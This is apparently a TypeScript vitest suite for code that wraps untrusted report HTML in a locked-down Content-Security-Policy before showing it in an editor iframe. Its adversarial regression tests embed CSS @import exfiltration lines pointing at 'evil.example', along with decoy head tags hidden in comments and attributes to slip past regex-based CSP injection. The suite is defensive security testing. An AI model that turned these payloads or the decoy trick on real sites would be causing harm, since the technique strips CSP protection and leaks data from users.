// SECURITY (blocker fix, see docs/adr/0062-editing-model-report-html-schema.md
// §9 amendment): `buildIframeDocument` used to locate <head>/</head> in
// `shell.pre` — UNTRUSTED, attacker-controlled HTML — with regex + lastIndexOf
// on raw text. Regex has no concept of "inside an HTML comment": a shell
// carrying a decoy head-shaped string inside a comment fools the regex into
// splicing the CSP <meta> into inert (never-parsed) comment text, while
// `lastIndexOf("</head>")` still finds the REAL </head> — so the real head,
// carrying the attacker's <style>, ships with NO CSP at all. Fixed by parsing
// with a real, comment-aware HTML parser and inserting the CSP meta as the
// parsed <head>'s first ELEMENT child, then serializing.
//
// `buildIframeDocument` takes an injectable `parseHtml` so this suite can run
// under vitest's plain `node` environment (this repo's only unit-test
// environment — see root vitest.config.ts) without adding a jsdom/happy-dom
// devDependency: production (`ReportEditor.tsx`, browser-only) relies on the
// default parser, the browser's native `DOMParser`, which is comment-aware
// and never ships an extra parsing library to the client bundle; this test
// file injects `linkedom`'s `parseHTML` instead — already a workspace
// dependency (`arp-report-html`'s server-side DOM backend, ADR-0062 §2's
// `dom-environment.ts`), also a real, comment-aware HTML5 parser, so the test
// exercises the same comment-awareness contract without a new dependency.
import { readFileSync } from "node:fs";
import path from "node:path";
import { fileURLToPath } from "node:url";
import type { Shell } from "arp-report-html";
import { reinjectShell, splitShell } from "arp-report-html";
import { parseHTML } from "linkedom";
import { describe, expect, it } from "vitest";
import { COMMENT_INTENT_COLORS } from "./comment-colors";
import {
  buildIframeDocument,
  buildReadOnlyIframeDocument,
  IFRAME_INJECTED_CSS,
} from "./iframe-document";

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const FIXTURE_PATH = path.resolve(
  __dirname,
  "../../report-html/src/fixtures/ai-readiness-report.html",
);

/** The test-only stand-in for the browser's `DOMParser`, injected into every
 *  `buildIframeDocument` call in this file (the production default —
 *  `new DOMParser()` — doesn't exist under Node). */
const testParse = (html: string): Document => parseHTML(html).document as unknown as Document;

/** Parses the OUTPUT of `buildIframeDocument` (not the input) so assertions
 *  prove what a real browser will see in its parsed <head>, not just what
 *  substring happens to appear somewhere in the serialized string. */
function parseOutput(doc: string): Document {
  return parseHTML(doc).document as unknown as Document;
}

function makeShell(overrides: Partial<Shell> = {}): Shell {
  return {
    pre:
      '<!doctype html><html><head><meta charset="utf-8"><style>body{color:red}</style></head>' +
      '<body class="report" data-theme="dark">',
    post: "</body></html>",
    ...overrides,
  };
}

describe("buildIframeDocument", () => {
  it("inserts the CSP meta tag as the first child of <head>, before the report's own <style>", () => {
    const doc = buildIframeDocument(makeShell(), testParse);
    const headStart = doc.indexOf("<head>") + "<head>".length;
    const cspIndex = doc.indexOf("Content-Security-Policy");
    const reportStyleIndex = doc.indexOf("body{color:red}");
    expect(cspIndex).toBeGreaterThan(-1);
    expect(reportStyleIndex).toBeGreaterThan(-1);
    // CSP meta immediately follows <head>, with nothing but our meta tag
    // between it and the next tag.
    expect(doc.slice(headStart, headStart + 5)).toBe("<meta");
    expect(cspIndex).toBeLessThan(reportStyleIndex);

    // Parse the OUTPUT too: prove a real browser sees the meta as head's
    // first ELEMENT child, not just that the substring appears early.
    const parsed = parseOutput(doc);
    expect(parsed.head.firstElementChild?.tagName).toBe("META");
    expect(parsed.head.firstElementChild?.getAttribute("http-equiv")).toBe(
      "Content-Security-Policy",
    );
  });

  it("locks the CSP down: no script/fetch, inline-only style, data:-only images/fonts, no 'self'", () => {
    const doc = buildIframeDocument(makeShell(), testParse);
    const match = /content="([^"]*)"/.exec(doc);
    expect(match).not.toBeNull();
    const content = match?.[1] ?? "";
    expect(content).toContain("default-src 'none'");
    expect(content).toContain("style-src 'unsafe-inline'");
    expect(content).toContain("img-src data:");
    expect(content).toContain("font-src data:");
    expect(content).toContain("base-uri 'none'");
    // No script-src override, and no 'unsafe-inline'/'unsafe-eval' for
    // scripts anywhere in the policy — default-src 'none' is the only
    // thing governing scripts.
    expect(content).not.toContain("script-src");
    // 'self' dropped (secondary hardening): reports are self-contained, so
    // 'self' only ever permitted a same-origin, cookie-bearing request
    // forgery surface against the app.<domain> origin — never a legitimate
    // report asset.
    expect(content).not.toContain("'self'");
  });

  it("appends the comment-highlight + auto-<p> safety-net style just before </head>", () => {
    const doc = buildIframeDocument(makeShell(), testParse);
    const headCloseIndex = doc.indexOf("</head>");
    const injectedIndex = doc.indexOf(".comment-highlight");
    expect(injectedIndex).toBeGreaterThan(-1);
    expect(injectedIndex).toBeLessThan(headCloseIndex);
    expect(doc).toContain(IFRAME_INJECTED_CSS);
  });

  it("injects one highlight color rule per intent, generated from the overlay palette", () => {
    // Comment-UX adoptions, item A: the CSS is generated from
    // COMMENT_INTENT_COLORS so the painted rules can never drift from the
    // exported constants.
    for (const [intent, colors] of Object.entries(COMMENT_INTENT_COLORS)) {
      expect(IFRAME_INJECTED_CSS).toContain(`.comment-highlight--${intent}`);
      expect(IFRAME_INJECTED_CSS).toContain(colors.background);
      expect(IFRAME_INJECTED_CSS).toContain(colors.underline);
    }
    // Item E's print half: the highlight pigments survive printing.
    expect(IFRAME_INJECTED_CSS).toContain("print-color-adjust: exact");
  });

  // A LATENT DEFECT, NOT THE PRODUCTION ANCHOR BUG — the distinction matters
  // because an earlier revision of this file asserted the second. ProseMirror's
  // own reveal (`scrollRectIntoView`, prosemirror-view 1.42.0) takes NO
  // behavior argument in either of its branches — `doc.defaultView.scrollBy(x,
  // y)` at the top level, `elt.scrollTop += moveY` for a nested scroll box — so
  // each is governed by the `scroll-behavior` of the box it scrolls. Inside the
  // editing iframe those boxes belong to the REPORT's own untrusted stylesheet.
  // A report that sets `html { scroll-behavior: smooth }` (one real generated
  // report does; the platform never adds it, and this repo's other report
  // fixture has none) turns every reveal the editor performs — the anchor jump
  // AND the comments panel's "Jump" — into a ~1.5s animation, measured.
  //
  // The editor surface therefore neutralises it. `!important` is deliberate:
  // this is an editor-tool override of author CSS, and losing to a report that
  // wrote `!important` would reinstate the animation. Ordering alone is not
  // enough to rely on either — the injected <style> is appended last today, but
  // that is a property of `injectCspIntoParsedDocument`, not of this rule.
  //
  // THE UNIVERSAL SELECTOR IS REQUIRED, not tidiness. `scroll-behavior` is NOT
  // an inherited property, so `html, body { … }` reaches exactly two elements
  // and leaves every nested scroll container alone — and real reports ship
  // those: the ai-readiness fixture's `.sidebar` is `position: sticky;
  // height: 100vh; overflow-y: auto`, i.e. its own scrolling box, and PM's
  // nested-box branch writes `elt.scrollTop` on precisely that kind of element.
  it("neutralises smooth scrolling on EVERY box in the editing surface", () => {
    // Comments stripped first: this file's own prose quotes CSS, and a
    // substring assertion against prose is not an assertion about a rule.
    const rules = IFRAME_INJECTED_CSS.replace(/\/\*[\s\S]*?\*\//g, "");
    expect(rules).toContain("scroll-behavior: auto !important");
    // The universal selector, not just the two root elements.
    expect(rules).toMatch(/(^|[\s,{}])\*\s*,[^{]*\{\s*scroll-behavior:\s*auto\s*!important/);
    const doc = buildIframeDocument(makeShell(), testParse);
    expect(doc).toContain("scroll-behavior: auto !important");
  });

  it("preserves the shell's <body> attributes/classes verbatim", () => {
    const doc = buildIframeDocument(makeShell(), testParse);
    expect(doc).toContain('<body class="report" data-theme="dark">');
  });

  it("produces an empty <body>...</body> — PM mounts and populates it itself", () => {
    const doc = buildIframeDocument(makeShell(), testParse);
    expect(doc).toContain('data-theme="dark"></body>');
  });

  it("preserves shell.pre and shell.post content exactly (nothing dropped or mutated)", () => {
    const shell = makeShell();
    const doc = buildIframeDocument(shell, testParse);
    expect(doc).toContain('<meta charset="utf-8">');
    const parsed = parseOutput(doc);
    expect(parsed.body.getAttribute("data-theme")).toBe("dark");
    expect(parsed.body.getAttribute("class")).toBe("report");
  });

  it("falls back to a synthesized head when shell.pre has no <head>...</head> (defensive)", () => {
    const shell: Shell = { pre: '<body class="x">', post: "</body>" };
    const doc = buildIframeDocument(shell, testParse);
    expect(doc).toContain("Content-Security-Policy");
    expect(doc).toContain(".comment-highlight");
    expect(doc).toContain('<body class="x">');
    expect(doc).toContain("</body>");
  });

  it("wraps the real fixture's shell without throwing and keeps its <style> content intact", () => {
    const original = readFileSync(FIXTURE_PATH, "utf-8");
    const { shell } = splitShell(original);
    const doc = buildIframeDocument(shell, testParse);
    expect(doc).toContain("Content-Security-Policy");
    expect(doc).toContain(".role-head { display: flex;");
    expect(doc).toContain(".comment-highlight");
  });

  // --- Adversarial cases (the actual regression tests for this fix) -------

  it("is not fooled by a decoy <head foo> INSIDE AN HTML COMMENT preceding the real head", () => {
    // Under the old regex (`/<head[^>]*>/i` + `lastIndexOf("</head>")`), the
    // decoy inside the comment matches the opening regex (comments are
    // invisible to regex), while `lastIndexOf` still finds the REAL
    // `</head>` — so the CSP meta lands inside the dead comment text (never
    // parsed, never enforced) and the real head — carrying the attacker's
    // `@import` exfil style — ships with no CSP at all. A real parser treats
    // comment content as inert text, never as a head-shaped tag, so it can't
    // be fooled this way.
    const shell: Shell = {
      pre:
        "<!doctype html><html><!-- decoy <head foo> -->" +
        "<head><style>@import url(https://evil.example/exfil.css);</style></head>" +
        '<body class="report">',
      post: "</body></html>",
    };
    const doc = buildIframeDocument(shell, testParse);
    const parsed = parseOutput(doc);

    // The CSP meta is the real <head>'s first ELEMENT child...
    expect(parsed.head.firstElementChild?.tagName).toBe("META");
    expect(parsed.head.firstElementChild?.getAttribute("http-equiv")).toBe(
      "Content-Security-Policy",
    );
    // ...and the attacker's @import <style> comes AFTER it in the same head,
    // so the CSP is in force before that style is ever parsed/applied.
    const children = [...parsed.head.children];
    const styleIndex = children.findIndex((el) => el.tagName === "STYLE");
    expect(styleIndex).toBeGreaterThan(0);
    expect(children[styleIndex]?.textContent).toContain("@import");
  });

  it("is not fooled by a decoy </head> inside a comment", () => {
    const shell: Shell = {
      pre:
        "<!doctype html><html><head><style>@import url(https://evil.example/exfil.css);" +
        "</style><!-- decoy </head> --></head>" +
        '<body class="report">',
      post: "</body></html>",
    };
    const doc = buildIframeDocument(shell, testParse);
    const parsed = parseOutput(doc);
    expect(parsed.head.firstElementChild?.tagName).toBe("META");
    expect(parsed.head.firstElementChild?.getAttribute("http-equiv")).toBe(
      "Content-Security-Policy",
    );
    // Only ONE head in the real parsed document — the decoy </head> inside
    // the comment didn't split it into two.
    expect(parsed.querySelectorAll("head")).toHaveLength(1);
  });

  it("is not fooled by a <head>-shaped string inside an attribute value", () => {
    const shell: Shell = {
      pre:
        "<!doctype html><html><head><style>@import url(https://evil.example/exfil.css);" +
        "</style></head>" +
        '<body class="report" data-x="<head>">',
      post: "</body></html>",
    };
    const doc = buildIframeDocument(shell, testParse);
    const parsed = parseOutput(doc);
    expect(parsed.head.firstElementChild?.tagName).toBe("META");
    expect(parsed.head.firstElementChild?.getAttribute("http-equiv")).toBe(
      "Content-Security-Policy",
    );
    // The attribute value survives verbatim as an attribute, not as markup.
    expect(parsed.body.getAttribute("data-x")).toBe("<head>");
    expect(parsed.querySelectorAll("head")).toHaveLength(1);
  });
});

describe("buildReadOnlyIframeDocument", () => {
  // View mode / Compare (F-1): the caller passes an ALREADY-ASSEMBLED full
  // document — typically `reinjectShell(shell, bodyHtml)` — unlike
  // `buildIframeDocument`, which only ever receives the shell (empty body,
  // PM mounts and populates it). Same CSP-injection mechanism underneath;
  // this suite re-proves the same security contract for this second entry
  // point rather than assuming it transfers, plus the one real behavioral
  // difference: body content is PRESERVED, not emptied.

  function makeFullHtml(bodyHtml: string, overrides: Partial<Shell> = {}): string {
    const shell: Shell = {
      pre:
        '<!doctype html><html><head><meta charset="utf-8"><style>body{color:red}</style></head>' +
        '<body class="report" data-theme="dark">',
      post: "</body></html>",
      ...overrides,
    };
    return reinjectShell(shell, bodyHtml);
  }

  it("inserts the CSP meta tag as the first child of <head>, before the report's own <style>", () => {
    const doc = buildReadOnlyIframeDocument(makeFullHtml("<p>hello</p>"), testParse);
    const parsed = parseOutput(doc);
    expect(parsed.head.firstElementChild?.tagName).toBe("META");
    expect(parsed.head.firstElementChild?.getAttribute("http-equiv")).toBe(
      "Content-Security-Policy",
    );
    const cspIndex = doc.indexOf("Content-Security-Policy");
    const reportStyleIndex = doc.indexOf("body{color:red}");
    expect(cspIndex).toBeGreaterThan(-1);
    expect(cspIndex).toBeLessThan(reportStyleIndex);
  });

  it("locks the CSP down identically to buildIframeDocument: no script/fetch, inline-only style, data:-only images/fonts, no 'self'", () => {
    const doc = buildReadOnlyIframeDocument(makeFullHtml("<p>hello</p>"), testParse);
    const match = /content="([^"]*)"/.exec(doc);
    const content = match?.[1] ?? "";
    expect(content).toContain("default-src 'none'");
    expect(content).toContain("style-src 'unsafe-inline'");
    expect(content).toContain("img-src data:");
    expect(content).toContain("font-src data:");
    expect(content).toContain("base-uri 'none'");
    expect(content).not.toContain("script-src");
    expect(content).not.toContain("'self'");
  });

  it("PRESERVES the body content passed in (unlike buildIframeDocument, which always yields an empty body)", () => {
    const doc = buildReadOnlyIframeDocument(
      makeFullHtml('<p class="rt">Hello <strong>world</strong></p>'),
      testParse,
    );
    const parsed = parseOutput(doc);
    expect(parsed.body.innerHTML).toContain('<p class="rt">Hello <strong>world</strong></p>');
    expect(parsed.body.getAttribute("data-theme")).toBe("dark");
  });

  it("is not fooled by a decoy <head foo> inside an HTML comment preceding the real head", () => {
    const fullHtml =
      "<!doctype html><html><!-- decoy <head foo> -->" +
      "<head><style>@import url(https://evil.example/exfil.css);</style></head>" +
      '<body class="report"><div class="rd">diff content</div></body></html>';
    const doc = buildReadOnlyIframeDocument(fullHtml, testParse);
    const parsed = parseOutput(doc);
    expect(parsed.head.firstElementChild?.tagName).toBe("META");
    expect(parsed.head.firstElementChild?.getAttribute("http-equiv")).toBe(
      "Content-Security-Policy",
    );
    const children = [...parsed.head.children];
    const styleIndex = children.findIndex((el) => el.tagName === "STYLE");
    expect(styleIndex).toBeGreaterThan(0);
    // The body content still comes through despite the decoy.
    expect(parsed.body.innerHTML).toContain("diff content");
  });

  it("falls back to a synthesized head when the input has no <head>...</head> (defensive)", () => {
    const fullHtml = '<body class="x"><p>orphan</p></body>';
    const doc = buildReadOnlyIframeDocument(fullHtml, testParse);
    expect(doc).toContain("Content-Security-Policy");
    expect(doc).toContain(".comment-highlight");
    expect(doc).toContain('<body class="x">');
    expect(doc).toContain("<p>orphan</p>");
  });

  it("wraps the real fixture's shell + body without throwing and keeps both the style and body content intact", () => {
    const original = readFileSync(FIXTURE_PATH, "utf-8");
    const { shell, bodyHtml } = splitShell(original);
    const doc = buildReadOnlyIframeDocument(reinjectShell(shell, bodyHtml), testParse);
    expect(doc).toContain("Content-Security-Policy");
    expect(doc).toContain(".role-head { display: flex;");
    expect(doc).toContain(".comment-highlight");
    const parsed = parseOutput(doc);
    expect(parsed.body.innerHTML.length).toBeGreaterThan(0);
  });
});
